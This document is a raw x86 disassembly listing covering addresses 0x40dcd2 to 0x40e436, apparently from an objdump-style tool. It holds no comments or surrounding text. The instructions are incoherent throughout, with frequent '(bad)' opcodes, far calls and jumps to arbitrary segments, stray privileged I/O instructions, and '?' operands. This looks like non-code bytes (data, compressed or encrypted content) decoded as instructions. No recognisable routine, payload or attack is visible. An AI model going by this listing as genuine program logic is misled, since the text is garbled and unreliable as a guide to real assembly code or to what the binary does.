  40dcd2:	test   al,0x59
  40dcd4:	(bad)  
  40dcd5:	(bad)  
  40dcd6:	arpl   di,ax
  40dcd8:	mov    dl,0xf6
  40dcda:	xchg   esp,eax
  40dcdb:	shl    BYTE PTR [esi-0x581dd0d9],1
  40dce1:	adc    eax,0x5c1bec05
  40dce6:	adc    eax,0x4a883a6a
  40dceb:	pop    esi
  40dcec:	pop    esp
  40dced:	xchg   DWORD PTR [eax-0x1c],esp
  40dcf0:	mov    bl,BYTE PTR [ebp-0x77]
  40dcf3:	jle    0x40dc9e
  40dcf5:	xchg   ebp,eax
  40dcf6:	iret   
  40dcf7:	inc    ebx
  40dcf8:	xchg   esp,eax
  40dcf9:	(bad)  
  40dcfa:	retf   
  40dcfb:	int3   
  40dcfc:	fnstenv [eax]
  40dcfe:	jg     0x40dcff
  40dd00:	mov    ?,WORD PTR [ebx]
  40dd02:	daa    
  40dd03:	pushf  
  40dd04:	sub    DWORD PTR [ebx+0x1ec73d49],ebp
  40dd0a:	mov    bh,0x6
  40dd0c:	sbb    edx,edx
  40dd0e:	in     al,dx
  40dd0f:	pop    ecx
  40dd10:	pushf  
  40dd11:	(bad)  
  40dd12:	popa   
  40dd13:	and    ecx,DWORD PTR [edx+0x2205e991]
  40dd19:	jne    0x40dd25
  40dd1b:	gs iret 
  40dd1d:	js     0x40dd89
  40dd1f:	cmp    BYTE PTR [esp+eiz*4-0x3afc58e9],al
  40dd26:	adc    BYTE PTR [ebx+0x4c],cl
  40dd29:	push   0xffffffa1
  40dd2b:	sub    ebp,DWORD PTR [eax+0x7b8460bc]
  40dd31:	das    
  40dd32:	mov    bl,0x78
  40dd34:	sbb    DWORD PTR [edi],0xfb4a1414
  40dd3a:	sbb    al,dh
  40dd3c:	push   ebx
  40dd3d:	inc    edi
  40dd3e:	aad    0x72
  40dd40:	add    BYTE PTR [ebx+0x51],cl
  40dd43:	ss cmp edx,ebp
  40dd46:	sar    DWORD PTR [ecx+0x5],cl
  40dd49:	jle    0x40dda4
  40dd4b:	cdq    
  40dd4c:	mov    ds:0xeef1bfd0,al
  40dd51:	adc    dl,bl
  40dd53:	dec    esp
  40dd54:	les    eax,FWORD PTR [esi]
  40dd56:	dec    esp
  40dd57:	mov    ebp,ds
  40dd59:	or     bh,BYTE PTR [ebp+0x2b]
  40dd5c:	lods   eax,DWORD PTR ds:[esi]
  40dd5d:	mov    cl,dl
  40dd5f:	mov    DWORD PTR [esi],eax
  40dd61:	mov    dh,0x1
  40dd63:	rcr    DWORD PTR [edx+0xf],0x20
  40dd67:	popf   
  40dd68:	gs dec edi
  40dd6a:	stos   DWORD PTR es:[edi],eax
  40dd6b:	pop    ebp
  40dd6c:	xor    DWORD PTR [ebx+edi*2+0x4d2c224e],0xa62294e2
  40dd77:	lahf   
  40dd78:	pop    ecx
  40dd79:	push   ebx
  40dd7a:	clc    
  40dd7b:	out    0x83,eax
  40dd7d:	test   al,0x13
  40dd7f:	lock jmp 0x2dc5:0xc7da4017
  40dd87:	mov    bl,0x44
  40dd89:	loopne 0x40ddd3
  40dd8b:	xchg   ebx,eax
  40dd8c:	pushf  
  40dd8d:	xchg   ebp,eax
  40dd8e:	mul    BYTE PTR [ecx-0x6c]
  40dd91:	dec    ebx
  40dd92:	add    al,0xba
  40dd94:	arpl   WORD PTR [ecx+0x393f344b],si
  40dd9a:	mov    BYTE PTR [ebp+0x3acd80f4],dh
  40dda0:	mov    dh,0x2e
  40dda2:	mov    eax,ecx
  40dda4:	jp     0x40ddb8
  40dda6:	jne    0x40dd47
  40dda8:	xchg   ebx,eax
  40dda9:	push   eax
  40ddaa:	lds    edx,FWORD PTR [eax]
  40ddac:	xchg   ebp,eax
  40ddad:	lods   eax,DWORD PTR gs:[esi]
  40ddaf:	jb     0x40dd7a
  40ddb1:	call   0x9053:0xa740d783
  40ddb8:	cmovnp edx,esi
  40ddbb:	aad    0x58
  40ddbd:	push   ebx
  40ddbe:	jbe    0x40ddf6
  40ddc0:	push   ds
  40ddc1:	adc    DWORD PTR [ebp+eiz*4+0x7b22d465],edx
  40ddc8:	(bad)  
  40ddc9:	repnz pop es
  40ddcb:	and    eax,0x5ac53b99
  40ddd0:	mov    DWORD PTR [eax+0x5],eax
  40ddd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddd4:	sti    
  40ddd5:	retf   
  40ddd6:	mov    dh,BYTE PTR [ecx+ebp*8]
  40ddd9:	mov    ah,0xa4
  40dddb:	pop    ds
  40dddc:	sbb    BYTE PTR [esi],cl
  40ddde:	test   eax,0x1e8ee45
  40dde3:	push   ds
  40dde4:	(bad)  
  40dde5:	in     al,0x38
  40dde7:	in     eax,dx
  40dde8:	mov    ebp,0x1576bab9
  40dded:	xor    DWORD PTR [ebx],esi
  40ddef:	aad    0xf0
  40ddf1:	xor    edi,edi
  40ddf3:	aam    0xe8
  40ddf5:	lds    eax,FWORD PTR [edx-0x3e]
  40ddf8:	popa   
  40ddf9:	sbb    cl,dh
  40ddfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddfc:	inc    ebp
  40ddfd:	shr    BYTE PTR [ecx-0x2dca495],0xfe
  40de04:	cmp    dh,BYTE PTR [ebx]
  40de06:	lods   al,BYTE PTR ds:[esi]
  40de07:	jb     0x40ddaf
  40de09:	(bad)  
  40de0a:	int    0xe3
  40de0c:	pop    ss
  40de0d:	ins    BYTE PTR es:[edi],dx
  40de0e:	dec    ecx
  40de0f:	fcomp  QWORD PTR [esi]
  40de11:	sub    DWORD PTR [eax],ebx
  40de13:	aaa    
  40de14:	cdq    
  40de15:	xchg   ecx,eax
  40de16:	cwde   
  40de17:	pop    esp
  40de18:	popa   
  40de19:	out    0xa4,al
  40de1b:	xchg   ebx,eax
  40de1c:	jge    0x40ddde
  40de1e:	call   0xcdc051b5
  40de23:	sub    BYTE PTR [ebp+0x47],0xfc
  40de27:	add    al,0xed
  40de29:	pop    esp
  40de2a:	mov    ebx,0xd69501de
  40de2f:	push   cs
  40de30:	add    ebx,DWORD PTR [edx-0x2b]
  40de33:	inc    ebp
  40de34:	add    edx,0x6dfde32f
  40de3a:	dec    ecx
  40de3b:	aad    0x21
  40de3d:	mov    BYTE PTR [eax-0x31],0x41
  40de41:	jecxz  0x40de89
  40de43:	gs xor dh,cl
  40de46:	call   0xac33:0xdbfa5867
  40de4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de4e:	add    edx,DWORD PTR [edi-0x47]
  40de51:	les    ebp,FWORD PTR [edi-0x66]
  40de54:	fstp   DWORD PTR [ecx-0x30]
  40de57:	or     bh,BYTE PTR [eax+0x3140c981]
  40de5d:	and    eax,0x6180b502
  40de62:	outs   dx,BYTE PTR ds:[esi]
  40de63:	add    dl,BYTE PTR [ebx+edx*4-0x32]
  40de67:	add    bh,BYTE PTR [edx-0x2]
  40de6a:	xchg   esi,eax
  40de6b:	xor    al,0x24
  40de6d:	out    0x92,eax
  40de6f:	fistp  WORD PTR [eax-0x42]
  40de72:	shr    BYTE PTR [ebp+0x6],1
  40de75:	xor    eax,0x90e5a0a8
  40de7a:	call   0x6c3c:0xfe927a5f
  40de81:	rcr    DWORD PTR [esi+0x416a28],cl
  40de87:	es sti 
  40de89:	int3   
  40de8a:	xchg   ebx,eax
  40de8b:	repnz mov bh,0xc4
  40de8e:	lahf   
  40de8f:	pop    ss
  40de90:	mov    bh,0x7f
  40de92:	adc    ebp,DWORD PTR [edi]
  40de94:	sub    BYTE PTR [edi+ebx*4+0xb0dfc4d],ch
  40de9b:	add    BYTE PTR [ebp+0x89c24b2],dh
  40dea1:	jg     0x40de9b
  40dea3:	out    dx,eax
  40dea4:	push   ecx
  40dea5:	enter  0x25d,0x4b
  40dea9:	sbb    ah,0xe5
  40deac:	and    edx,DWORD PTR [ecx-0x39]
  40deaf:	cmc    
  40deb0:	push   ds
  40deb1:	out    0x4,al
  40deb3:	(bad)  
  40deb4:	(bad)  [edx+ecx*1]
  40deb7:	jo     0x40df1c
  40deb9:	push   eax
  40deba:	inc    ebx
  40debb:	mov    dh,0x52
  40debd:	(bad)  
  40debe:	shl    dh,0x4c
  40dec1:	add    BYTE PTR [edi],al
  40dec3:	arpl   WORD PTR [ecx+0x6b],bp
  40dec6:	xlat   BYTE PTR ds:[ebx]
  40dec7:	les    eax,FWORD PTR [ebp+0x68720b64]
  40decd:	fstp   TBYTE PTR [edi-0x555fdb70]
  40ded3:	jp     0x40deed
  40ded5:	pop    esp
  40ded6:	les    esi,FWORD PTR [edi]
  40ded8:	sbb    cl,BYTE PTR [edi+0x75]
  40dedb:	inc    esp
  40dedc:	push   0x41f0423b
  40dee1:	call   0x823b:0x57af5bd7
  40dee8:	cmc    
  40dee9:	mov    al,ds:0xc9262d51
  40deee:	pop    eax
  40deef:	and    eax,0xfdcf958d
  40def4:	ds jp  0x40df07
  40def7:	aad    0x5
  40def9:	daa    
  40defa:	jp     0x40de82
  40defc:	fistp  QWORD PTR [ecx+eax*8-0x1b]
  40df00:	(bad)  
  40df01:	cmp    DWORD PTR [eax+0x2efaabae],eax
  40df07:	jmp    0x40df36
  40df09:	jp     0x40def6
  40df0b:	push   0x940d6a9d
  40df10:	pushf  
  40df11:	jns    0x40defe
  40df13:	in     al,dx
  40df14:	add    DWORD PTR [edx-0x63],edx
  40df17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df18:	test   BYTE PTR [eax],dl
  40df1a:	jns    0x40dee6
  40df1c:	fcom   st(5)
  40df1e:	gs pop es
  40df20:	and    ebx,DWORD PTR [ebx-0x6825e7b7]
  40df26:	and    eax,0xc4fd01f0
  40df2b:	jbe    0x40df48
  40df2d:	xor    al,0x75
  40df2f:	jl     0x40debb
  40df31:	add    BYTE PTR [eax+0xe],0x2d
  40df35:	mov    ch,BYTE PTR [esi+0x9]
  40df38:	push   esi
  40df39:	and    dh,BYTE PTR [edi+0x7acaa63d]
  40df3f:	nop
  40df40:	mov    al,0xa4
  40df42:	xchg   edx,eax
  40df43:	mov    ebx,0xcb98df6
  40df48:	stos   BYTE PTR es:[edi],al
  40df49:	adc    eax,0xd51b23e
  40df4e:	jmp    0x40dfc4
  40df50:	pop    ebp
  40df51:	pop    esp
  40df52:	push   ds
  40df53:	fbstp  TBYTE PTR [esi+0x2a745a02]
  40df59:	adc    eax,0xc8bc3ac0
  40df5e:	inc    esi
  40df60:	es and eax,0xcea0e9aa
  40df66:	mov    WORD PTR [ebx],ss
  40df68:	adc    BYTE PTR [edi+0x12],dh
  40df6b:	dec    ebx
  40df6c:	bnd jle 0x40df4d
  40df6f:	jmp    0x40dfb6
  40df71:	mov    ebp,gs
  40df73:	daa    
  40df74:	dec    edi
  40df75:	(bad)  
  40df76:	addr16 mov dl,0xb3
  40df79:	cmp    ebx,ebp
  40df7b:	cmp    al,0xbd
  40df7d:	fist   WORD PTR [edi-0x53]
  40df80:	lahf   
  40df81:	(bad)  
  40df82:	ror    BYTE PTR [esi+esi*2+0x4f9df3d6],cl
  40df89:	and    al,0xc7
  40df8b:	or     DWORD PTR [esi-0x60bcac6],ebx
  40df91:	cmp    BYTE PTR [ebx-0x2],ch
  40df94:	stos   DWORD PTR es:[edi],eax
  40df95:	jmp    0x40e015
  40df97:	sbb    eax,esp
  40df99:	or     DWORD PTR [ebx],ecx
  40df9b:	adc    al,0x27
  40df9d:	jmp    0x356dc701
  40dfa2:	ret    0x37ed
  40dfa5:	adc    bl,BYTE PTR [ebp-0x1da0456f]
  40dfab:	jge    0x40df44
  40dfad:	or     bl,BYTE PTR [ebp-0x507fbb90]
  40dfb3:	add    esp,ecx
  40dfb5:	mov    al,BYTE PTR [esi+0x2a3fb54a]
  40dfbb:	sub    al,0x5b
  40dfbd:	mov    dh,0xe1
  40dfbf:	mov    ah,0x29
  40dfc1:	aas    
  40dfc2:	imul   ecx,DWORD PTR [ecx+0x7d],0xffffffb9
  40dfc6:	jecxz  0x40e006
  40dfc8:	daa    
  40dfc9:	cdq    
  40dfca:	xor    al,0x33
  40dfcc:	sbb    al,0x5a
  40dfce:	das    
  40dfcf:	mov    DWORD PTR [ecx+ecx*8+0x17],0x773d87c4
  40dfd7:	add    edx,esp
  40dfd9:	fucom  st(7)
  40dfdb:	shl    DWORD PTR ds:0x8d066ddf,0x62
  40dfe2:	scas   eax,DWORD PTR es:[edi]
  40dfe3:	and    BYTE PTR [eax+eax*1],al
  40dfe6:	dec    ebp
  40dfe7:	and    DWORD PTR [ecx-0x5010dd01],esp
  40dfed:	out    0xe9,eax
  40dfef:	xchg   edx,eax
  40dff0:	cld    
  40dff1:	adc    BYTE PTR [edi-0x544c0713],0x16
  40dff8:	mov    edx,DWORD PTR [edx+0x22]
  40dffb:	pop    edx
  40dffc:	pop    ds
  40dffd:	cmp    al,0x34
  40dfff:	mov    edi,?
  40e001:	and    BYTE PTR [edi],cl
  40e003:	loope  0x40e083
  40e005:	xor    DWORD PTR ds:0x46139a3e,esp
  40e00b:	and    bh,0x18
  40e00e:	test   eax,0x1ac54051
  40e013:	test   al,0x25
  40e015:	sbb    bl,dh
  40e017:	arpl   WORD PTR [edx+edx*2],dx
  40e01a:	inc    ebp
  40e01b:	add    ecx,ebx
  40e01d:	int3   
  40e01e:	push   ebx
  40e01f:	push   eax
  40e020:	test   eax,eax
  40e022:	push   esp
  40e023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e024:	sbb    ecx,esi
  40e026:	repnz fs or eax,0xd738c6c8
  40e02d:	in     eax,dx
  40e02e:	dec    eax
  40e02f:	gs cmp edx,ecx
  40e032:	xchg   dh,dl
  40e034:	mov    edx,0xa8929c94
  40e039:	scas   al,BYTE PTR es:[edi]
  40e03a:	imul   eax,DWORD PTR [ebx-0x4e],0x7dd66c79
  40e041:	repnz push ebp
  40e043:	shr    DWORD PTR [edi-0x2a],0x6e
  40e047:	mov    al,ch
  40e049:	mov    al,ds:0xa88556ef
  40e04e:	je     0x40e03e
  40e050:	inc    eax
  40e051:	fcom   DWORD PTR [ecx-0x42]
  40e054:	test   BYTE PTR [eax],dh
  40e056:	xor    BYTE PTR [edx-0x6d],0x6b
  40e05a:	push   ds
  40e05b:	sbb    DWORD PTR [edx+ebx*1],ebx
  40e05e:	xchg   edx,eax
  40e05f:	mov    esi,0xac109c55
  40e064:	inc    edx
  40e065:	xchg   dh,dh
  40e067:	push   ds
  40e068:	jge    0x40e01d
  40e06a:	ss pop esp
  40e06c:	test   BYTE PTR [edi-0x23],bl
  40e06f:	and    dh,BYTE PTR [ebx+0x676d3b31]
  40e075:	sbb    eax,0xf18d2ac5
  40e07a:	(bad)
  40e07d:	mov    ch,0x85
  40e07f:	xor    al,0x96
  40e081:	cmc    
  40e082:	lock pop ebp
  40e084:	mov    DWORD PTR [esi-0x45],esi
  40e087:	xor    al,0xef
  40e089:	call   0x86cd73f6
  40e08e:	je     0x40e0cd
  40e090:	inc    esp
  40e091:	aam    0x18
  40e093:	sbb    edx,eax
  40e095:	jl     0x40e067
  40e097:	rcpps  xmm7,XMMWORD PTR [ebx]
  40e09a:	fcmovnu st,st(1)
  40e09c:	sbb    dh,BYTE PTR [ebp-0x8520fe7]
  40e0a2:	inc    edi
  40e0a3:	(bad)  
  40e0a4:	jbe    0x40e042
  40e0a6:	hlt    
  40e0a7:	xlat   BYTE PTR ds:[ebx]
  40e0a8:	test   ah,ah
  40e0aa:	aam    0x3d
  40e0ac:	nop
  40e0ad:	out    dx,eax
  40e0ae:	sub    BYTE PTR [ebp+0x446e2eb1],al
  40e0b4:	mov    ebx,0x4d87cd5a
  40e0b9:	push   ds
  40e0ba:	cmp    al,0xf1
  40e0bc:	xlat   BYTE PTR ds:[ebx]
  40e0bd:	push   cs
  40e0be:	stos   DWORD PTR es:[edi],eax
  40e0bf:	and    eax,0x1c62a04e
  40e0c4:	inc    edi
  40e0c5:	jp     0x40e0f7
  40e0c7:	sbb    dh,BYTE PTR [ecx]
  40e0c9:	and    ch,BYTE PTR [ebx-0x1]
  40e0cc:	sub    al,0xab
  40e0ce:	jno    0x40e06f
  40e0d0:	shr    bh,0x85
  40e0d3:	dec    edi
  40e0d4:	cmp    eax,0x9a990f3a
  40e0d9:	mov    esp,0x7662a623
  40e0de:	(bad)  
  40e0e0:	jp     0x40e11a
  40e0e2:	mov    al,ds:0x48d232e9
  40e0e7:	sbb    esp,esi
  40e0e9:	sub    al,BYTE PTR [ecx+0x3248b3f7]
  40e0ef:	cwde   
  40e0f0:	(bad)  
  40e0f1:	xchg   edx,eax
  40e0f2:	cwde   
  40e0f3:	xlat   BYTE PTR ds:[ebx]
  40e0f4:	(bad)  
  40e0f5:	in     al,0x25
  40e0f7:	daa    
  40e0f8:	mov    al,0x6a
  40e0fa:	iret   
  40e0fb:	aad    0x6b
  40e0fd:	or     ebx,esp
  40e0ff:	inc    ebx
  40e100:	pop    eax
  40e101:	stos   DWORD PTR es:[edi],eax
  40e102:	mov    ch,BYTE PTR [edi+ebx*8-0x1fba16f0]
  40e109:	sti    
  40e10a:	push   esp
  40e10b:	jle    0x40e0b7
  40e10d:	jb     0x40e122
  40e10f:	pop    ecx
  40e110:	or     al,0x48
  40e112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e113:	push   cs
  40e114:	mov    ecx,0x55de497d
  40e119:	jmp    0x40e15d
  40e11b:	jmp    0x40e12c
  40e11d:	aam    0xa6
  40e11f:	les    ecx,FWORD PTR [ebp*2-0x49843bd6]
  40e126:	call   0xc085:0x7ba6f397
  40e12d:	les    esi,FWORD PTR [edi]
  40e12f:	mov    dh,0xcf
  40e131:	or     dh,0xc7
  40e134:	dec    ebp
  40e135:	addr16 loopne 0x40e0fd
  40e138:	xor    edx,DWORD PTR [ecx-0x4f]
  40e13b:	sbb    edi,eax
  40e13d:	cld    
  40e13e:	push   0x5b
  40e140:	adc    esp,esp
  40e142:	fwait
  40e143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e144:	out    dx,eax
  40e145:	mov    cs,WORD PTR [ebx]
  40e147:	xor    al,BYTE PTR [edx]
  40e149:	les    edi,FWORD PTR [edi+0x58923b5c]
  40e14f:	jns    0x40e0d7
  40e151:	ss push ebp
  40e153:	popf   
  40e154:	cmp    dh,BYTE PTR [esi+0x140d2ee8]
  40e15a:	pop    edx
  40e15b:	mov    eax,0xda2f1b12
  40e160:	push   0x1e4aab49
  40e165:	je     0x40e17e
  40e167:	(bad)  
  40e168:	ffree  st(3)
  40e16a:	mov    ebp,0x3be9f607
  40e16f:	cwde   
  40e170:	jno    0x40e1f1
  40e172:	pop    es
  40e173:	and    si,WORD PTR [esi]
  40e176:	jle    0x40e158
  40e178:	adc    eax,0xd89fb1f3
  40e17d:	inc    edx
  40e17e:	lods   eax,DWORD PTR ds:[esi]
  40e17f:	mov    bh,0x2e
  40e181:	add    BYTE PTR [esi+0x59],dh
  40e184:	aam    0x3b
  40e186:	xchg   bx,ax
  40e188:	frstor [eax-0x7f]
  40e18b:	cdq    
  40e18c:	sub    al,0xf4
  40e18e:	inc    edx
  40e18f:	and    eax,0x52dcdc7e
  40e194:	call   0x6e7edd1
  40e199:	loop   0x40e15a
  40e19b:	pop    ss
  40e19c:	in     eax,0xb7
  40e19e:	or     al,0xd5
  40e1a0:	hlt    
  40e1a1:	mov    ebx,0x59f55a03
  40e1a6:	scas   al,BYTE PTR es:[edi]
  40e1a7:	ins    DWORD PTR es:[edi],dx
  40e1a8:	mov    ds:0xfa0692ec,eax
  40e1ad:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40e1af:	leave  
  40e1b0:	and    eax,DWORD PTR ds:0x6956d9eb
  40e1b6:	pop    ss
  40e1b7:	in     eax,0xf4
  40e1b9:	add    esi,0xffffff98
  40e1bc:	jl     0x40e173
  40e1be:	ret    0x328c
  40e1c1:	dec    edi
  40e1c2:	out    0x41,al
  40e1c4:	dec    esp
  40e1c5:	xchg   ebp,eax
  40e1c6:	xor    al,0x3e
  40e1c8:	jno    0x40e208
  40e1ca:	ret    
  40e1cb:	and    ch,BYTE PTR es:[ebx]
  40e1ce:	jbe    0x40e195
  40e1d0:	lahf   
  40e1d1:	mov    BYTE PTR [edi+0x55],cl
  40e1d4:	add    DWORD PTR [edi-0x10],0x64
  40e1d8:	hlt    
  40e1d9:	jg     0x40e219
  40e1db:	jnp    0x40e235
  40e1dd:	ret    
  40e1de:	xor    BYTE PTR [ecx],dh
  40e1e0:	fld    DWORD PTR ds:0x6e4aab02
  40e1e6:	cmp    al,0xd9
  40e1e8:	cmp    BYTE PTR [ebx-0x4f02919b],al
  40e1ee:	scas   al,BYTE PTR es:[edi]
  40e1ef:	pop    esp
  40e1f0:	(bad)  
  40e1f2:	scas   eax,DWORD PTR es:[edi]
  40e1f3:	dec    esp
  40e1f4:	or     eax,edi
  40e1f6:	and    al,0x27
  40e1f8:	test   al,0x9d
  40e1fa:	mov    ah,BYTE PTR [edx+0x7f]
  40e1fd:	mov    edi,0xfe4ad1ec
  40e202:	lea    esp,[ecx+ebp*8]
  40e205:	mov    eax,0x92c50102
  40e20a:	dec    ebx
  40e20b:	sbb    al,0x38
  40e20d:	dec    edx
  40e20e:	mov    ds:0x761fc8a4,al
  40e213:	inc    edi
  40e214:	or     al,0x1d
  40e216:	or     DWORD PTR [esp+esi*4+0x6e5e6cc],ebx
  40e21d:	adc    dh,BYTE PTR ds:[ebp+0x5]
  40e221:	or     esp,DWORD PTR [ebx+0x7cd80cf7]
  40e227:	mov    ss,WORD PTR [esi]
  40e229:	jmp    0x3081:0xd1d8bc57
  40e230:	push   ebp
  40e231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e232:	ja     0x40e1b6
  40e234:	adc    bh,BYTE PTR [ebx-0x7300a5c2]
  40e23a:	and    DWORD PTR [ebp-0x1d],edi
  40e23d:	(bad)  
  40e23e:	xor    dl,ch
  40e240:	aaa    
  40e241:	cmp    DWORD PTR [edx+0x778a78fe],0xb
  40e248:	or     al,0xdc
  40e24a:	aad    0x4e
  40e24c:	adc    bl,BYTE PTR [edi-0x4dba6b49]
  40e252:	int    0x5
  40e254:	cmp    DWORD PTR [esi],0xf493a240
  40e25a:	repz div DWORD PTR [ecx]
  40e25d:	lea    eax,[ebx+esi*2]
  40e260:	pop    edi
  40e261:	loopne 0x40e268
  40e263:	stc    
  40e264:	jmp    0x3e5b5346
  40e269:	inc    esp
  40e26a:	aaa    
  40e26b:	mov    ebx,0xc8b1a5b
  40e270:	retf   0x9035
  40e273:	clc    
  40e274:	mov    edi,edx
  40e276:	xchg   edx,eax
  40e277:	loope  0x40e278
  40e279:	pop    ebp
  40e27a:	das    
  40e27b:	inc    eax
  40e27c:	dec    eax
  40e27d:	(bad)  
  40e27f:	push   edi
  40e280:	ficomp WORD PTR [edi]
  40e282:	or     al,0x3a
  40e284:	cmp    al,0x4f
  40e286:	test   al,0x54
  40e288:	xlat   BYTE PTR ds:[ebx]
  40e289:	pop    ss
  40e28a:	mov    dh,0xcf
  40e28c:	imul   edi,DWORD PTR [ebx],0x21759935
  40e292:	(bad)  
  40e293:	aaa    
  40e294:	(bad)  
  40e295:	shl    DWORD PTR [eax-0xc],1
  40e298:	gs mov ah,0xd6
  40e29b:	(bad)  
  40e29c:	dec    edx
  40e29d:	xchg   ecx,eax
  40e29e:	dec    esi
  40e29f:	mov    ch,0x55
  40e2a1:	in     eax,dx
  40e2a2:	pop    ebp
  40e2a3:	sti    
  40e2a4:	loop   0x40e28c
  40e2a6:	jl     0x40e2d4
  40e2a8:	dec    eax
  40e2a9:	cmc    
  40e2aa:	mov    ch,0xfa
  40e2ac:	adc    ebp,DWORD PTR [edx+0x25]
  40e2af:	inc    edx
  40e2b0:	mov    eax,0xcbaca501
  40e2b5:	out    0xf2,eax
  40e2b7:	outs   dx,DWORD PTR ds:[esi]
  40e2b8:	xor    dl,cl
  40e2ba:	jmp    FWORD PTR [ebx-0x71]
  40e2bd:	push   cs
  40e2be:	rcr    BYTE PTR [ebx],0x46
  40e2c1:	hlt    
  40e2c2:	fbstp  TBYTE PTR [ebx+0x1f]
  40e2c5:	rcl    BYTE PTR ds:0xd355c42a,0xea
  40e2cc:	shl    BYTE PTR [ecx-0x644addbe],cl
  40e2d2:	lea    ecx,[esi]
  40e2d4:	push   edx
  40e2d5:	xchg   DWORD PTR [edi-0x45],eax
  40e2d8:	enter  0xb32d,0xb2
  40e2dc:	jns    0x40e278
  40e2de:	test   BYTE PTR [ebp+0x56],dl
  40e2e1:	sbb    eax,DWORD PTR [eiz*8-0x72545e6e]
  40e2e8:	or     al,BYTE PTR [eax]
  40e2ea:	aam    0x54
  40e2ec:	sub    al,0xd4
  40e2ee:	xor    cl,dh
  40e2f0:	dec    esi
  40e2f1:	test   eax,0x123dfb33
  40e2f6:	call   0xac0e:0x6538a475
  40e2fd:	outs   dx,BYTE PTR ds:[esi]
  40e2fe:	mov    ecx,0xf3264ea
  40e303:	popa   
  40e304:	adc    DWORD PTR [edx+esi*4-0x6f68bfe1],edi
  40e30b:	repnz (bad) 
  40e30d:	sub    eax,DWORD PTR [ebx+0x7aaf1534]
  40e313:	xchg   ch,cl
  40e315:	fs push ss
  40e317:	xchg   ecx,eax
  40e318:	fisttp DWORD PTR [ecx-0x3b]
  40e31b:	pushf  
  40e31c:	dec    ebp
  40e31d:	push   ecx
  40e31e:	mov    edi,0xca2dba86
  40e323:	mov    ebx,0x576915e1
  40e328:	sbb    DWORD PTR [edx+edi*1+0x703a7390],ecx
  40e32f:	push   0xffffffc8
  40e331:	xchg   DWORD PTR [ecx+0x1bc897f3],ebx
  40e337:	stos   BYTE PTR es:[edi],al
  40e338:	sti    
  40e339:	pop    edi
  40e33a:	iret   
  40e33b:	dec    edx
  40e33c:	fcom   QWORD PTR [ebp-0x6f]
  40e33f:	imul   ecx,esp,0xffffffc3
  40e342:	test   al,0x6f
  40e344:	dec    edi
  40e345:	ja     0x40e2ef
  40e347:	icebp  
  40e348:	arpl   WORD PTR [ebx],sp
  40e34a:	adc    DWORD PTR [edi+ebp*1+0x59],0x49
  40e34f:	es repz push ecx
  40e352:	jle    0x40e311
  40e354:	pop    eax
  40e355:	jb     0x40e37d
  40e357:	int3   
  40e358:	enter  0x3833,0x45
  40e35c:	pop    esi
  40e35d:	lock mov ds:0xa69c6587,al
  40e363:	cmp    BYTE PTR [edi+0x3a96759e],dl
  40e369:	cmp    bl,0xd2
  40e36c:	jns    0x40e363
  40e36e:	xchg   ebp,eax
  40e36f:	call   esp
  40e371:	sbb    DWORD PTR [esi-0x6a534c6a],eax
  40e377:	pop    ds
  40e378:	add    al,0xc8
  40e37a:	mov    ecx,0x2dfefd4b
  40e37f:	mov    dh,BYTE PTR [edi+0x4785abc9]
  40e385:	(bad)  
  40e386:	out    0x12,eax
  40e388:	imul   edi,DWORD PTR [ebx+0x37e3bed5],0xa
  40e38f:	push   esp
  40e390:	cmp    ebp,DWORD PTR [esi+0x10]
  40e393:	xor    eax,0x5a05d5ba
  40e398:	push   esp
  40e399:	jmp    0xaf85:0xeee4554a
  40e3a0:	mov    eax,ds:0x3f038ebc
  40e3a5:	inc    eax
  40e3a6:	jnp    0x40e3a8
  40e3a8:	fnstenv [ecx+eax*1-0x2c2eb5e]
  40e3af:	outs   dx,BYTE PTR ds:[esi]
  40e3b0:	rcr    BYTE PTR [ebp+0x2b],cl
  40e3b3:	shl    BYTE PTR [edi],0x77
  40e3b6:	dec    ebx
  40e3b7:	rcl    DWORD PTR [ecx-0x62],1
  40e3ba:	inc    ebp
  40e3bb:	push   esp
  40e3bc:	jl     0x40e38a
  40e3be:	in     al,dx
  40e3bf:	add    al,0xa6
  40e3c1:	test   DWORD PTR [eax+eiz*2-0x38a11c0d],esi
  40e3c8:	hlt    
  40e3c9:	ret    
  40e3ca:	push   ebp
  40e3cb:	cmp    bh,BYTE PTR [edx+esi*2+0x5f686f5c]
  40e3d2:	sub    DWORD PTR [ebp-0x69],ebp
  40e3d5:	cmp    cl,BYTE PTR [edi+0x5e5bd2ca]
  40e3db:	repnz fist WORD PTR [eax]
  40e3de:	mov    al,ds:0x961675dc
  40e3e3:	pop    ecx
  40e3e4:	xchg   ch,al
  40e3e6:	fsubr  QWORD PTR [edx-0x2d]
  40e3e9:	rcl    DWORD PTR [di-0x67],0x6f
  40e3ee:	xchg   ebp,eax
  40e3ef:	aaa    
  40e3f0:	out    dx,al
  40e3f1:	retf   
  40e3f2:	aaa    
  40e3f3:	loope  0x40e3d8
  40e3f5:	lods   al,BYTE PTR ds:[esi]
  40e3f6:	sbb    al,dl
  40e3f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3f9:	jecxz  0x40e405
  40e3fb:	xor    ah,BYTE PTR [ecx-0x12]
  40e3fe:	call   0xae7939c5
  40e403:	loopne 0x40e3fe
  40e405:	loopne 0x40e38c
  40e407:	pop    edi
  40e408:	dec    ebp
  40e409:	inc    esp
  40e40a:	or     ebp,DWORD PTR [ecx+eiz*8]
  40e40d:	sahf   
  40e40e:	inc    ebx
  40e40f:	xchg   edi,eax
  40e410:	mov    bh,0x6e
  40e412:	ret    
  40e413:	cmc    
  40e414:	int    0x6a
  40e416:	sbb    ah,cl
  40e418:	lds    esi,FWORD PTR [esi+0x5b60ada1]
  40e41e:	xchg   edx,eax
  40e41f:	popa   
  40e420:	ret    0x31d8
  40e423:	pop    edx
  40e424:	jmp    0xbb5e06ae
  40e429:	inc    ebx
  40e42a:	mov    BYTE PTR [ebp+0x34],bh
  40e42d:	test   DWORD PTR [ecx+0x6e],ebx
  40e430:	and    ebp,DWORD PTR [esi-0x436659ed]
  40e436:	lea    ecx,[ecx+0x4c]
